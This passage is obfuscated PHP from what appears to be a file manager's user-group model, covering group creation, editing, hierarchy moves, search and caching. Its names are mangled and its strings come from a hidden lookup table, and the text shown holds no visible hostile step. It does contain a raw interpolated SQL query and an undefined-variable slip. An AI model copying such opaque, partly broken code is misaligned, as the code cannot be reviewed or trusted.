=> "\147\x72\157\165\160\137\155\x65\164\141", "\x6d\145\x74\x61\x46\151\145\x6c\x64" => "\147\162\x6f\165\160\111\104"); protected function cacheFunctionAlias($áÈó‘á) { $óƒ‚ÎÂÚ =& $_SERVER[”ôÑ§ì¸]; return array($óƒ‚ÎÂÚ[1944] => array($áÈó‘á[0], $óƒ‚ÎÂÚ[1945]), $óƒ‚ÎÂÚ[1946] => array($áÈó‘á[0], $óƒ‚ÎÂÚ[1947])); } protected function getInfo($—¥‰Å‡ú, $‡ı”™ = false) { $¦İß•ıÔ = $this->getInfoSimple($—¥‰Å‡ú); if (!$¦İß•ıÔ) { return !1; } if ($‡ı”™) { return $this->_listDataApplyItem($¦İß•ıÔ); } return $this->cacheFunctionGet($_SERVER[”ôÑ§ì¸][1948], $—¥‰Å‡ú); } protected function getInfoSimple($­¸Ş˜, $ÎÉ’–Â¤ = false) { $àÓ“³¨ =& $_SERVER[”ôÑ§ì¸]; if ($ÎÉ’–Â¤) { $¹Áü»Œ = array($àÓ“³¨[1866] => intval($­¸Ş˜)); $øÖš†Âú = $this->where($¹Áü»Œ)->find(); return is_array($øÖš†Âú) ? $øÖš†Âú : array(); } return $this->cacheFunctionGet($àÓ“³¨[1949], $­¸Ş˜); } protected function groupAdd($ÔåëÙ ¶) { $—ê¯ş·³ =& $_SERVER[”ôÑ§ì¸]; if (!$ÔåëÙ ¶[$—ê¯ş·³[179]] && isset($ÔåëÙ ¶[$—ê¯ş·³[1866]]) && $ÔåëÙ ¶[$—ê¯ş·³[1866]] == 1) { if ($—Ã´½Í = $this->getInfoSimple($ÔåëÙ ¶[$—ê¯ş·³[1866]], !0)) { return $ÔåëÙ ¶[$—ê¯ş·³[1866]]; } } else { $—Ã´½Í = $this->getInfoSimple($ÔåëÙ ¶[$—ê¯ş·³[179]]); if (!$—Ã´½Í) { return !1; } } $Ü‡Æíä´ = $—ê¯ş·³[562]; if ($—Ã´½Í[$—ê¯ş·³[552]]) { $Ü‡Æíä´ = $—Ã´½Í[$—ê¯ş·³[552]] . $—Ã´½Í[$—ê¯ş·³[1866]] . $—ê¯ş·³[50]; } $¼©†Òšô = array($—ê¯ş·³[461] => $this->groupNameAuto($ÔåëÙ ¶[$—ê¯ş·³[179]], $ÔåëÙ ¶[$—ê¯ş·³[32]]), $—ê¯ş·³[444] => $ÔåëÙ ¶[$—ê¯ş·³[179]], $—ê¯ş·³[619] => $Ü‡Æíä´, $—ê¯ş·³[1950] => $ÔåëÙ ¶[$—ê¯ş·³[1853]], $—ê¯ş·³[1951] => 0, $—ê¯ş·³[1870] => 0); if (isset($ÔåëÙ ¶[$—ê¯ş·³[1890]])) { $¼©†Òšô[$—ê¯ş·³[1890]] = $ÔåëÙ ¶[$—ê¯ş·³[1890]]; } else { $æğ²–’… = $this->max($—ê¯ş·³[1890]); if (!$æğ²–’…) { $æğ²–’… = 0; } $¼©†Òšô[$—ê¯ş·³[1890]] = $æğ²–’… + 1; } if (!empty($ÔåëÙ ¶[$—ê¯ş·³[1866]])) { $¼©†Òšô[$—ê¯ş·³[1866]] = $ÔåëÙ ¶[$—ê¯ş·³[1866]]; } $“ıßŸ‘¤ = $this->add($¼©†Òšô); $this->setNamePinyin($“ıßŸ‘¤, $¼©†Òšô[$—ê¯ş·³[32]]); if (isset($ÔåëÙ ¶[$—ê¯ş·³[1952]])) { $this->metaSet($“ıßŸ‘¤, array($—ê¯ş·³[1952] => $ÔåëÙ ¶[$—ê¯ş·³[1952]], $—ê¯ş·³[1953] => $ÔåëÙ ¶[$—ê¯ş·³[1953]])); unset($ÔåëÙ ¶[$—ê¯ş·³[1952]]); unset($ÔåëÙ ¶[$—ê¯ş·³[1953]]); } Model($—ê¯ş·³[1363])->groupRootAdd($“ıßŸ‘¤); $this->_clearCache($ÔåëÙ ¶[$—ê¯ş·³[179]]); return $“ıßŸ‘¤; } protected function groupEdit($¡©Û×˜™, $œâş‰Ææ) { $»Ü÷…úÊ =& $_SERVER[”ôÑ§ì¸]; $¹¤…¨Ú = $this->getInfoSimple($¡©Û×˜™); if (!$¹¤…¨Ú) { return !1; } if (!empty($œâş‰Ææ[$»Ü÷…úÊ[179]])) { $´‚™”‘™ = $this->getInfoSimple($œâş‰Ææ[$»Ü÷…úÊ[179]]); if (!$´‚™”‘™) { return !1; } if ($¹¤…¨Ú[$»Ü÷…úÊ[1866]] == $´‚™”‘™[$»Ü÷…úÊ[1866]]) { return !1; } if ($œâş‰Ææ[$»Ü÷…úÊ[179]] != $¹¤…¨Ú[$»Ü÷…úÊ[179]]) { if ($´‚™”‘™[$»Ü÷…úÊ[552]] !== $¹¤…¨Ú[$»Ü÷…úÊ[552]] && strpos($´‚™”‘™[$»Ü÷…úÊ[552]], $¹¤…¨Ú[$»Ü÷…úÊ[552]] . $¹¤…¨Ú[$»Ü÷…úÊ[1866]] . $»Ü÷…úÊ[50]) === 0) { return !1; } $œâş‰Ææ[$»Ü÷…úÊ[619]] = $´‚™”‘™[$»Ü÷…úÊ[552]] . $œâş‰Ææ[$»Ü÷…úÊ[179]] . $»Ü÷…úÊ[50]; $this->_changeChildLevel($¹¤…¨Ú, $´‚™”‘™); $this->_clearCache($´‚™”‘™[$»Ü÷…úÊ[1866]]); $this->_clearCache($¹¤…¨Ú[$»Ü÷…úÊ[179]]); } } if (isset($œâş‰Ææ[$»Ü÷…úÊ[32]])) { $this->setNamePinyin($¡©Û×˜™, $œâş‰Ææ[$»Ü÷…úÊ[32]]); } if (isset($œâş‰Ææ[$»Ü÷…úÊ[1952]])) { $this->metaSet($¡©Û×˜™, array($»Ü÷…úÊ[1952] => $œâş‰Ææ[$»Ü÷…úÊ[1952]], $»Ü÷…úÊ[1953] => $œâş‰Ææ[$»Ü÷…úÊ[1953]])); unset($œâş‰Ææ[$»Ü÷…úÊ[1952]]); unset($œâş‰Ææ[$»Ü÷…úÊ[1953]]); } $this->_clearChildrenCache($¹¤…¨Ú); return $this->where(array($»Ü÷…úÊ[1954] => $¡©Û×˜™))->save($œâş‰Ææ); } private function _clearChildrenCache($Å´ ªÍ) { $ãÀ³™Ğá =& $_SERVER[”ôÑ§ì¸]; $Ø ‡³‰  = array($ãÀ³™Ğá[619] => array($ãÀ³™Ğá[579], $Å´ ªÍ[$ãÀ³™Ğá[552]] . $Å´ ªÍ[$ãÀ³™Ğá[1866]] . $ãÀ³™Ğá[580])); $¬¼Ô¾É‘ = $this->field($ãÀ³™Ğá[1866])->where($Ø ‡³‰ )->select(); foreach ($¬¼Ô¾É‘ as $¬¶ÆËÅš) { $this->_clearCache($¬¶ÆËÅš[$ãÀ³™Ğá[1866]]); } } private function _clearCache($©Øˆ†º…) { $øÂ—ş“ =& $_SERVER[”ôÑ§ì¸]; $this->cacheFunctionClear($øÂ—ş“[1948], $©Øˆ†º…); $this->cacheFunctionClear($øÂ—ş“[1949], $©Øˆ†º…); } private function _changeChildLevel($òìñ×±, $É¡ëĞ«Ş, $øŸäÛÆï = false) { $ú‚‡“ı¶ =& $_SERVER[”ôÑ§ì¸]; $Ôœ»áò = $òìñ×±[$ú‚‡“ı¶[552]] . $òìñ×±[$ú‚‡“ı¶[1866]] . $ú‚‡“ı¶[50]; $Ñ¡ô¨Üğ = $É¡ëĞ«Ş[$ú‚‡“ı¶[552]] . $É¡ëĞ«Ş[$ú‚‡“ı¶[1866]] . $ú‚‡“ı¶[50] . $òìñ×±[$ú‚‡“ı¶[1866]] . $ú‚‡“ı¶[50]; if ($øŸäÛÆï) { $Ñ¡ô¨Üğ = $É¡ëĞ«Ş[$ú‚‡“ı¶[552]] . $É¡ëĞ«Ş[$ú‚‡“ı¶[1866]] . $ú‚‡“ı¶[50]; } $¯èÆ·Ïç = array($ú‚‡“ı¶[619] => array($ú‚‡“ı¶[579], $òìñ×±[$ú‚‡“ı¶[552]] . $òìñ×±[$ú‚‡“ı¶[1866]] . $ú‚‡“ı¶[580])); $íÈúÓõ = array($ú‚‡“ı¶[619] => array($ú‚‡“ı¶[628], "\162\145\160\154\x61\143\x65\50\160\141\x72\x65\x6e\x74\x4c\145\166\x65\154\x2c\x27{$Ôœ»áò}\x27\54\x27{$Ñ¡ô¨Üğ}\47\51")); $this->_clearChildrenCache($òìñ×±); $this->where($¯èÆ·Ïç)->data($íÈúÓõ)->save(); } public function setNamePinyin($¤¦¦š¥¹, $£ó¸ô˜ = false) { $®¥åööç =& $_SERVER[”ôÑ§ì¸]; if (!$£ó¸ô˜) { $íËÂ¸ä = $this->getInfoSimple($¤¦¦š¥¹); $£ó¸ô˜ = $íËÂ¸ä[$®¥åööç[32]]; } if (!Input::check($£ó¸ô˜, $®¥åööç[622])) { $this->metaSet($¤¦¦š¥¹, $®¥åööç[505], null); $this->metaSet($¤¦¦š¥¹, $®¥åööç[504], null); return; } $½úĞªß = array($®¥åööç[505] => str_replace($®¥åööç[53], $®¥åööç[12], Pinyin::get($£ó¸ô˜)), $®¥åööç[504] => Pinyin::get($£ó¸ô˜, $®¥åööç[623])); $this->metaSet($¤¦¦š¥¹, $½úĞªß); } protected function groupStatus($º™¢£î´, $ì‹¸õä) { $™ÉëÂ÷ô =& $_SERVER[”ôÑ§ì¸]; $çÎƒ¯Ş› = $this->getInfoSimple($º™¢£î´); if (!$çÎƒ¯Ş›) { return !1; } if ($ì‹¸õä == $™ÉëÂ÷ô[88]) { $ù×»®ØÊ = $this->parentLevelArray($çÎƒ¯Ş›[$™ÉëÂ÷ô[552]]); } else { $ŒƒÈ‘úã = array($™ÉëÂ÷ô[619] => array($™ÉëÂ÷ô[579], $çÎƒ¯Ş›[$™ÉëÂ÷ô[552]] . $çÎƒ¯Ş›[$™ÉëÂ÷ô[1866]] . $™ÉëÂ÷ô[580])); $ù×»®ØÊ = $this->where($ŒƒÈ‘úã)->field($™ÉëÂ÷ô[1866])->select(); $ù×»®ØÊ = array_to_keyvalue($ù×»®ØÊ, $™ÉëÂ÷ô[12], $™ÉëÂ÷ô[1866]); } $ù×»®ØÊ[] = $çÎƒ¯Ş›[$™ÉëÂ÷ô[1866]]; $Îèçòİ = array(); foreach ($ù×»®ØÊ as $º™¢£î´) { $Îèçòİ[] = array($™ÉëÂ÷ô[1866] => $º™¢£î´, $™ÉëÂ÷ô[94] => $™ÉëÂ÷ô[772], $™ÉëÂ÷ô[417] => $ì‹¸õä); $this->_clearCache($º™¢£î´); } return Model($™ÉëÂ÷ô[1955])->addAll($Îèçòİ, array(), !0); } protected function groupRemove($Û ÏÆá, $ê–‹±¡Í = false) { $ÛàÖÛÙ =& $_SERVER[”ôÑ§ì¸]; $ë˜ÌÍÁ = array($ÛàÖÛÙ[1866] => $Û ÏÆá); $ÌóŒ©ó© = $this->where($ë˜ÌÍÁ)->find(); if (!$ÌóŒ©ó© || $ÌóŒ©ó©[$ÛàÖÛÙ[179]] == 0) { return !1; } if (!$ê–‹±¡Í) { $Ç´³òÄ = $this->getInfoSimple($ÌóŒ©ó©[$ÛàÖÛÙ[179]]); $this->_changeChildLevel($ÌóŒ©ó©, $Ç´³òÄ, !0); $this->where(array($ÛàÖÛÙ[179] => $Û ÏÆá))->save(array($ÛàÖÛÙ[179] => $ÌóŒ©ó©[$ÛàÖÛÙ[179]])); $this->_clearCache($Ç´³òÄ[$ÛàÖÛÙ[1866]]); } Model($ÛàÖÛÙ[1955])->where($ë˜ÌÍÁ)->delete(); Model($ÛàÖÛÙ[1956])->where($ë˜ÌÍÁ)->delete(); Model($ÛàÖÛÙ[847])->groupRootRemove($Û ÏÆá); $this->_clearCache($ÌóŒ©ó©[$ÛàÖÛÙ[179]]); return $this->where($ë˜ÌÍÁ)->delete(); } protected function groupSort($«‡üÔÏ) { $ºôıâ¤è =& $_SERVER[”ôÑ§ì¸]; $ŒÇÚªÃş = array(); foreach ($«‡üÔÏ as $éòÙú‹ª => $ï¾ÀÇ¦Ç) { $ŒÇÚªÃş[] = array($ºôıâ¤è[1866], $ï¾ÀÇ¦Ç, $ºôıâ¤è[1890], $éòÙú‹ª + 1); } $this->saveAll($ŒÇÚªÃş); } public function listData() { $·É°¡– = $this->_makeOrder()->selectPage(50); $this->_listDataApply($·É°¡–[$_SERVER[”ôÑ§ì¸][412]]); return $·É°¡–; } private function _makeOrder($×ò¼ß’õ = '') { $Ë¨¯ˆøŠ =& $_SERVER[”ôÑ§ì¸]; $´»ìàõ… = array($Ë¨¯ˆøŠ[1866], $Ë¨¯ˆøŠ[32], $Ë¨¯ˆøŠ[1855], $Ë¨¯ˆøŠ[214]); $‚‘º÷¦Ë = array($Ë¨¯ˆøŠ[490] => $Ë¨¯ˆøŠ[491], $Ë¨¯ˆøŠ[492] => $Ë¨¯ˆøŠ[493]); $ˆ¸Óà•£ = Input::get($Ë¨¯ˆøŠ[497], $Ë¨¯ˆøŠ[7], $Ë¨¯ˆøŠ[1870], $´»ìàõ…); $‹èïÖ¾³ = Input::get($Ë¨¯ˆøŠ[498], $Ë¨¯ˆøŠ[7], $Ë¨¯ˆøŠ[1957], array($Ë¨¯ˆøŠ[1957], $Ë¨¯ˆøŠ[492])); $‹èïÖ¾³ = $‚‘º÷¦Ë[$‹èïÖ¾³]; $×ò¼ß’õ = $×ò¼ß’õ . "{$ˆ¸Óà•£}\x20{$‹èïÖ¾³}\54\x20\x67\162\x6f\x75\160\x49\x44\x20\141\x73\143"; return $this->order($×ò¼ß’õ); } public function listChild($Õ‡Ã¿âã) { $íûâéÉ¡ =& $_SERVER[”ôÑ§ì¸]; $†ñ¢âÒù = $this->where(array($íûâéÉ¡[179] => $Õ‡Ã¿âã))->_makeOrder()->selectPage(200); $this->_listDataApply($†ñ¢âÒù[$íûâéÉ¡[412]]); return $†ñ¢âÒù; } public function listChildIds($Áôîé¾›) { $×Ùè›Çê =& $_SERVER[”ôÑ§ì¸]; if (is_string($ˆ…¿Ç¾Æ)) { $Áôîé¾› = explode($×Ùè›Çê[50], $Áôîé¾›); } $éí‚’’¢ = $this->where(array($×Ùè›Çê[1866] => array($×Ùè›Çê[7], $Áôîé¾›)))->field($×Ùè›Çê[1958])->select(); if (!$éí‚’’¢) { return !1; } $È€ßÏíœ = array(); foreach ($éí‚’’¢ as $¾Íí§ÊÏ) { $È€ßÏíœ[] = "\x73\x65\x6c\x65\143\x74\40\x67\162\x6f\x75\160\x49\x44\40\146\x72\157\x6d\x20\140\147\x72\157\x75\x70\140\x20\x77\x68\145\162\145\x20\x70\x61\162\x65\x6e\x74\114\x65\x76\x65\x6c\x20\x6c\x69\x6b\145\x20\x27{$¾Íí§ÊÏ[$×Ùè›Çê[552]]}{$¾Íí§ÊÏ[$×Ùè›Çê[1866]]}\54\x25\x27"; } $È€ßÏíœ = implode($×Ùè›Çê[1959], $È€ßÏíœ); $éí‚’’¢ = $this->query($È€ßÏíœ); if (!$éí‚’’¢) { return array(); } $Áôîé¾› = array_to_keyvalue($éí‚’’¢, $×Ùè›Çê[12], $×Ùè›Çê[1866]); return array_unique($Áôîé¾›); } public function listByID($ŞæÌ¦å) { $–ù›¬Éá =& $_SERVER[”ôÑ§ì¸]; if (!$ŞæÌ¦å) { return array(); } $ŒçòÃôÍ = array($–ù›¬Éá[1866] => array($–ù›¬Éá[7], $ŞæÌ¦å)); $Ì§€ãŞ = $this->where($ŒçòÃôÍ)->select(); $Ì§€ãŞ = array_sort_keep($Ì§€ãŞ, $–ù›¬Éá[1866], $ŞæÌ¦å); $this->_listDataApply($Ì§€ãŞ); return $Ì§€ãŞ; } public function listSearch($úƒàİãµ) { $¹µùó÷Ü =& $_SERVER[”ôÑ§ì¸]; $ŞÑİ³‘Í = $úƒàİãµ[$¹µùó÷Ü[1960]]; $Ûå¸å¿ = isset($úƒàİãµ[$¹µùó÷Ü[1961]]) ? $úƒàİãµ[$¹µùó÷Ü[1961]] : !1; if (!trim($ŞÑİ³‘Í)) { return !1; } $ŞÑİ³‘Í = str_replace($¹µùó÷Ü[1962], $¹µùó÷Ü[1963], $ŞÑİ³‘Í); $ö¤Ïå©• = array($¹µùó÷Ü[1866] => array($¹µùó÷Ü[426], "{$ŞÑİ³‘Í}\45"), $¹µùó÷Ü[32] => array($¹µùó÷Ü[426], "\45{$ŞÑİ³‘Í}\45"), $¹µùó÷Ü[1031] => $¹µùó÷Ü[1964]); if ($Ûå¸å¿) { $Â²¥¥Ü = $this->getInfoSimple($Ûå¸å¿); $Óô°Çé = $Â²¥¥Ü[$¹µùó÷Ü[552]] . $Ûå¸å¿ . $¹µùó÷Ü[580]; $ö¤Ïå©• = array($ö¤Ïå©•, array($¹µùó÷Ü[552] => array($¹µùó÷Ü[426], $Óô°Çé))); } $ö¤Ïå©• = $this->parseWhereLike($ö¤Ïå©•); $™§¢¥¦³ = $this->_makeOrder()->where($ö¤Ïå©•)->selectPage(20); $™§¢¥¦³ = $™§¢¥¦³ ? $™§¢¥¦³ : array($¹µùó÷Ü[412] => array(), $¹µùó÷Ü[409] => array()); if (!$™§¢¥¦³ || count($™§¢¥¦³[$¹µùó÷Ü[412]]) < 5 && Input::check($ŞÑİ³‘Í, $¹µùó÷Ü[361])) { $§’‡ëÑò = $this->groupChildrenAll($Ûå¸å¿); $°º˜³ğÀ = $this->_searchFromMeta($¹µùó÷Ü[504], $ŞÑİ³‘Í, 10, $§’‡ëÑò); $ûø„»³ë = $this->_searchFromMeta($¹µùó÷Ü[505], $ŞÑİ³‘Í, 10, $§’‡ëÑò); $ª¨ö‹¿ = array_merge($°º˜³ğÀ, $ûø„»³ë, $™§¢¥¦³[$¹µùó÷Ü[412]]); $™§¢¥¦³[$¹µùó÷Ü[412]] = array_unique_by_key($ª¨ö‹¿, $¹µùó÷Ü[1866]); $™§¢¥¦³[$¹µùó÷Ü[409]][$¹µùó÷Ü[410]] = count($™§¢¥¦³[$¹µùó÷Ü[412]]); $™§¢¥¦³[$¹µùó÷Ü[409]][$¹µùó÷Ü[411]] = ceil($™§¢¥¦³[$¹µùó÷Ü[409]][$¹µùó÷Ü[410]] / $™§¢¥¦³[$¹µùó÷Ü[409]][$¹µùó÷Ü[406]]); } $this->_listDataApply($™§¢¥¦³[$¹µùó÷Ü[412]]); return $™§¢¥¦³; } protected function groupChildrenAll($‡ºËµòá) { $ù‰±·±» =& $_SERVER[”ôÑ§ì¸]; if (!$‡ºËµòá) { return !1; } if (is_string($‡ºËµòá)) { $‡ºËµòá = array($‡ºËµòá); } $´Ï®°Æš = $‡ºËµòá; foreach ($‡ºËµòá as $ÂÆ¡âêõ) { $¢˜ñÛúÕ = $this->getInfoSimple($ÂÆ¡âêõ); $â‚ğóôÛ = array($ù‰±·±»[552] => array($ù‰±·±»[426], $¢˜ñÛúÕ[$ù‰±·±»[552]] . $ÂÆ¡âêõ . $ù‰±·±»[580])); $õæËá´Ü = $this->field($ù‰±·±»[1866])->where($â‚ğóôÛ)->select(); $´Ï®°Æš = array_merge($´Ï®°Æš, array_to_keyvalue($õæËá´Ü, $ù‰±·±»[12], $ù‰±·±»[1866])); } return array_unique($´Ï®°Æš); } private function _searchFromMeta($ëâåÛ†¸, $ËƒîëÍ—, $Ş¡“Œåˆ, $”æêœ­é) { $ã¤ÅÀÔ =& $_SERVER[”ôÑ§ì¸]; $ËƒîëÍ— = strtolower($ËƒîëÍ—); $×Ú¹‚¢ù = array($ã¤ÅÀÔ[94] => $ëâåÛ†¸, $ã¤ÅÀÔ[417] => array($ã¤ÅÀÔ[426], "\x25{$ËƒîëÍ—}\45")); $×Ú¹‚¢ù = $this->parseWhereLike($×Ú¹‚¢ù); if ($”æêœ­é) { $×Ú¹‚¢ù[$ã¤ÅÀÔ[1866]] = array($ã¤ÅÀÔ[7], $”æêœ­é); } $ºÂôØœ¢ = Model($ã¤ÅÀÔ[1965])->where($×Ú¹‚¢ù)->limit($Ş¡“Œåˆ)->select(); if (!$ºÂôØœ¢) { return array(); } $ºÂôØœ¢ = array_to_keyvalue($ºÂôØœ¢, $ã¤ÅÀÔ[12], $ã¤ÅÀÔ[1866]); $‡Ÿ¬§£  = $this->where(array($ã¤ÅÀÔ[1954] => array($ã¤ÅÀÔ[7], $ºÂôØœ¢)))->select(); if (!$‡Ÿ¬§£ ) { return array(); } return $‡Ÿ¬§£ ; } protected function _listDataApplyItem($÷®Ë†¯Ÿ) { $îƒ€˜à¹ = array($÷®Ë†¯Ÿ); $this->_listDataApply($îƒ€˜à¹); return $îƒ€˜à¹[0]; } protected function _listDataApply(&$µÛâ½â) { $‚­ğ¼Á© =& $_SERVER[”ôÑ§ì¸]; if (!$µÛâ½â) { return; } $´ÑİÏ– = array_to_keyvalue($µÛâ½â, $‚­ğ¼Á©[12], $‚­ğ¼Á©[1866]); $this->_listAppendChildren($µÛâ½â); $this->_listAppendChildrenMember($µÛâ½â); $this->_listAppendMeta($µÛâ½â, $´ÑİÏ–); $this->_listAppendParent($µÛâ½â); $this->_listAppendSourceRoot($µÛâ½â, $´ÑİÏ–); } private function _listAppendChildren(&$˜”µÈÂš) { $Šë€Äæú =& $_SERVER[”ôÑ§ì¸]; $ã¬ÄŸİÜ = array_to_keyvalue($˜”µÈÂš, $Šë€Äæú[12], $Šë€Äæú[1866]); $‚ğ³ŒÛş = array($Šë€Äæú[179] => array($Šë€Äæú[7], $ã¬ÄŸİÜ)); $íñÎ › = array($Šë€Äæú[179], $Šë€Äæú[1966] => $Šë€Äæú[532]); $øôÈÜ×Ü = $this->field($íñÎ ›)->where($‚ğ³ŒÛş)->group($Šë€Äæú[179])->select(); $¸ôüßáœ = array_to_keyvalue($øôÈÜ×Ü, $Šë€Äæú[179], $Šë€Äæú[532]); foreach ($˜”µÈÂš as &$Ú‡»æª¨) { $Çˆ¶ŸÎä = $Ú‡»æª¨[$Šë€Äæú[1866]]; $Ú‡»æª¨[$Šë€Äæú[1967]] = isset($¸ôüßáœ[$Çˆ¶ŸÎä]) ? intval($¸ôüßáœ[$Çˆ¶ŸÎä]) : !1; } unset($Ú‡»æª¨); } private function _listAppendChildrenMember(&$³éòÖÓÅ) { $µûëĞà  =& $_SERVER[”ôÑ§ì¸]; $‘•³ŠÖã = array_to_keyvalue($³éòÖÓÅ, $µûëĞà [12], $µûëĞà [1866]); $×ÕšÊ»¬ = array($µûëĞà [1866] => array($µûëĞà [7], $‘•³ŠÖã)); $¶óŸºìã = array($µûëĞà [1866], $µûëĞà [1966] => $µûëĞà [532]); $ïÅ´²¸ß = Model($µûëĞà [1956])->field($¶óŸºìã)->where($×ÕšÊ»¬)->group($µûëĞà [1866])->select(); $™ûËØ’÷ = array_to_keyvalue($ïÅ´²¸ß, $µûëĞà [1866], $µûëĞà [532]); foreach ($³éòÖÓÅ as &$Äºã¸×Ş) { $Ã¾ş†Ò = $Äºã¸×Ş[$µûëĞà [1866]]; $Äºã¸×Ş[$µûëĞà [1968]] = isset($™ûËØ’÷[$Ã¾ş†Ò]) ? intval($™ûËØ’÷[$Ã¾ş†Ò]) : !1; } unset($Äºã¸×Ş); } private function _listAppendMeta(&$ñ±àƒÆ, $²Ï¦¨„) { $¬öÊ™Ó” =& $_SERVER[”ôÑ§ì¸]; $“¸Ë†¤ = array($¬öÊ™Ó”[1866] => array($¬öÊ™Ó”[7], $²Ï¦¨„)); $áÆîîÙ´ = Model($¬öÊ™Ó”[1955])->where($“¸Ë†¤)->select(); $áÆîîÙ´ = array_to_keyvalue_group($áÆîîÙ´, $¬öÊ™Ó”[1866]); foreach ($áÆîîÙ´ as &$”Ù´ØÁ) { $”Ù´ØÁ = array_to_keyvalue($”Ù´ØÁ, $¬öÊ™Ó”[94], $¬öÊ™Ó”[417]); } unset($”Ù´ØÁ); foreach ($ñ±àƒÆ as &$×ğÛæÕĞ) { $×ğÛæÕĞ[$¬öÊ™Ó”[506]] = array(); if (isset($áÆîîÙ´[$×ğÛæÕĞ[$¬öÊ™Ó”[1866]]])) { $×ğÛæÕĞ[$¬öÊ™Ó”[506]] = $áÆîîÙ´[$×ğÛæÕĞ[$¬öÊ™Ó”[1866]]]; } } unset($×ğÛæÕĞ); } protected function parentLevelArray($¶ü„¢¦ê) { $…°ê€Ù› =& $_SERVER[”ôÑ§ì¸]; $¶ü„¢¦ê = explode($…°ê€Ù›[50], trim($¶ü„¢¦ê, $…°ê€Ù›[50])); $¶ü„¢¦ê = array_remove_value($¶ü„¢¦ê, $…°ê€Ù›[211]); return $¶ü„¢¦ê; } protected function parentInGroup($óÅ×™°×, $Ğ¨âÓê‘) { $ıÙ™†‚š =& $_SERVER[”ôÑ§ì¸]; $ÏÄÔ›³¶ = $this->getInfoSimple($óÅ×™°×); if (!$ÏÄÔ›³¶) { return !0; } $Ïêö˜Û = $this->parentLevelArray($ÏÄÔ›³¶[$ıÙ™†‚š[552]]); $Ïêö˜Û[] = $óÅ×™°×; foreach ($Ïêö˜Û as $óÅ×™°×) { if (in_array($óÅ×™°× . $ıÙ™†‚š[12], $Ğ¨âÓê‘)) { return !0; } } return !1; } private function _listAppendParent(&$‹äµúÃÛ) { $˜ó­ÃÆÑ =& $_SERVER[”ôÑ§ì¸]; $€º“‚Æ³ = array(); foreach ($‹äµúÃÛ as &$ú¯†¶Óï) { $€º“‚Æ³[$ú¯†¶Óï[$˜ó­ÃÆÑ[1866]]] = $ú¯†¶Óï[$˜ó­ÃÆÑ[32]]; $Ğâî•­Œ = $this->parentLevelArray($ú¯†¶Óï[$˜ó­ÃÆÑ[552]]); foreach ($Ğâî•­Œ as $ó¼Ò¾£È) { if (!isset($€º“‚Æ³[$ó¼Ò¾£È])) { $€º“‚Æ³[$ó¼Ò¾£È] = 0; } } } unset($ú¯†¶Óï); foreach ($€º“‚Æ³ as $¬õœæğÃ => $•¤Ë‡œö) { if ($•¤Ë‡œö) { continue; } $Ü“³³»Û = $this->getInfoSimple($¬õœæğÃ); $€º“‚Æ³[$¬õœæğÃ] = $Ü“³³»Û[$˜ó­ÃÆÑ[32]]; } $–óØºà = $GLOBALS[$˜ó­ÃÆÑ[6]][$˜ó­ÃÆÑ[89]][$˜ó­ÃÆÑ[1969]]; if ($GLOBALS[$˜ó­ÃÆÑ[535]] == $˜ó­ÃÆÑ[88]) { $–óØºà = !1; } foreach ($‹äµúÃÛ as &$ú¯†¶Óï) { $Ğâî•­Œ = $this->parentLevelArray($ú¯†¶Óï[$˜ó­ÃÆÑ[552]]); $ô¿œšë÷ = $˜ó­ÃÆÑ[12]; foreach ($Ğâî•­Œ as $¬õœæğÃ => $ó¼Ò¾£È) { if ($–óØºà && $¬õœæğÃ == 0) { continue; } $ô¿œšë÷ .= $€º“‚Æ³[$ó¼Ò¾£È] . $˜ó­ÃÆÑ[8]; } if ($Ğâî•­Œ) { $ô¿œšë÷ .= $ú¯†¶Óï[$˜ó­ÃÆÑ[32]]; } $ú¯†¶Óï[$˜ó­ÃÆÑ[557]] = str_replace($˜ó­ÃÆÑ[560], $˜ó­ÃÆÑ[8], $ô¿œšë÷); } unset($ú¯†¶Óï); } private function _listAppendSourceRoot(&$¿şÒ„£, $ùôÒÌ¯†) { $È›ÆßŠğ =& $_SERVER[”ôÑ§ì¸]; $ª¡¿÷ñË = Model($È›ÆßŠğ[847])->listSourceRoot(SourceModel::TYPE_GROUP, $ùôÒÌ¯†); $ª¡¿÷ñË = array_to_keyvalue($ª¡¿÷ñË, $È›ÆßŠğ[537]); $ª¡¿÷ñË = array_remove_key($ª¡¿÷ñË, $È›ÆßŠğ[537]); foreach ($¿şÒ„£ as &$ÑˆÌÒ¦) { $ÑˆÌÒ¦[$È›ÆßŠğ[87]] = $ª¡¿÷ñË[$ÑˆÌÒ¦[$È›ÆßŠğ[1866]]] ? $ª¡¿÷ñË[$ÑˆÌÒ¦[$È›ÆßŠğ[1866]]] : array(); } unset($ÑˆÌÒ¦); } protected function groupMerge($ª“Ë·ØÏ) { $ª“Ë·ØÏ = array_values(array_unique($ª“Ë·ØÏ)); $ôÓë·Ì« = array(); for ($Ãƒ‘‹Œè = 0; $Ãƒ‘‹Œè < count($ª“Ë·ØÏ); $Ãƒ‘‹Œè++) { $¦ëÚ„õÀ = !1; for ($÷•¦—’” = 0; $÷•¦—’” < count($ª“Ë·ØÏ); $÷•¦—’”++) { if ($Ãƒ‘‹Œè == $÷•¦—’”) { continue; } if ($this->isParentOf($ª“Ë·ØÏ[$÷•¦—’”], $ª“Ë·ØÏ[$Ãƒ‘‹Œè])) { $¦ëÚ„õÀ = !0; break; } } if (!$¦ëÚ„õÀ) { $ôÓë·Ì«[] = $ª“Ë·ØÏ[$Ãƒ‘‹Œè]; } } return $ôÓë·Ì«; } protected function isParentOf($·³ù¯ü, $×ß× Ï) { $ñÑ–ÑÎæ =& $_SERVER[”ôÑ§ì¸]; if (!$·³ù¯ü || !$×ß× Ï || $·³ù¯ü == $×ß× Ï) { return !1; } $’Ç©ãŠü = $this->getInfoSimple($·³ù¯ü); $·ÁÕ†©Í = $this->getInfoSimple($×ß× Ï); $’«‰¿à = $’Ç©ãŠü[$ñÑ–ÑÎæ[552]] . $·³ù¯ü . $ñÑ–ÑÎæ[50]; if (substr($·ÁÕ†©Í[$ñÑ–ÑÎæ[552]], 0, strlen($’«‰¿à)) == $’«‰¿à) { return !0; } return !1; } public function groupShowRoot($‰ı•‹®ƒ, $µÎİñ‰½ = false) { $è³¾ĞÖ  =& $_SERVER[”ôÑ§ì¸]; $âŸİØ³˜ = $this->getInfo($‰ı•‹®ƒ); if (!$âŸİØ³˜) { return array(); } $“óìâÂ¥ = $this->parentLevelArray($âŸİØ³˜[$è³¾ĞÖ [552]]); $‹ØìÍ® = array($‰ı•‹®ƒ); if (count($“óìâÂ¥) == 0) { return $‹ØìÍ®; } if ($µÎİñ‰½ && count($“óìâÂ¥) == 1) { return $‹ØìÍ®; } if (!$âŸİØ³˜[$è³¾ĞÖ [506]] || 